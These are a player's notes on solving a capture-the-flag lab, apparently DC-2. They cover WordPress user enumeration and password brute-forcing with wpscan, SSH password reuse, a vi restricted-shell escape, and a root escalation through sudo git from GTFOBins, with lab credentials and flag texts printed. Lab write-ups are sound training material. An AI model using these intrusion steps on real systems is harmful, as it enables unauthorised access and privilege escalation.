#found first flag on the cms:
	Your usual wordlists probably won’t work, so instead, maybe you just need to be cewl.
	More passwords is always better, but sometimes you just can’t win them all.
	Log in as one to see the next flag.
	If you can’t find it, log in as another.

#used wpscan to enumerate. found 3 users, admin, tom, jerry

#used wpscan to brute force found pass of tom and jerry:
	[!] Valid Combinations Found:
	 | Username: jerry, Password: adipiscing
	 | Username: tom, Password: parturient

#found flag 2 as a page:
	If you can't exploit WordPress and take a shortcut, there is another way.
	Hope you found another entry point.

#got in uing same pass in ssh

#in the restricted shel. used thsi to break out:
	vi
	:set shell-/bin/bash
	:shell

#got flag 3 using the less command because cat and head were not available:
	Poor old Tom is always running after Jerry. Perhaps he should su for all the stress he causes.

#just went to jerry home directory and got flag 4:
	Good to see that you've made it this far - but you're not home yet. 
	You still need to get the final flag (the only flag that really counts!!!).  
	No hints here - you're on your own now.  :-)
	Go on - git outta here!!!!

#but for priv esc we need jerry. used this command to use su and sudo:
	export PATH=/bin:/usr/bin:$PATH

#now su to jerry using the same pass

#now sudo -l

#git from gtfobins
	sudo git branch --help config
	!/bin/sh

#got root!
	cat final-flag.txt
	 __    __     _ _       _                    _ 
	/ / /\ \ \___| | |   __| | ___  _ __   ___  / \
	\ \/  \/ / _ \ | |  / _` |/ _ \| '_ \ / _ \/  /
	 \  /\  /  __/ | | | (_| | (_) | | | |  __/\_/ 
	  \/  \/ \___|_|_|  \__,_|\___/|_| |_|\___\/   


	Congratulatons!!!

	A special thanks to all those who sent me tweets
	and provided me with feedback - it's all greatly
	appreciated.

	If you enjoyed this CTF, send me a tweet via @DCAU7.

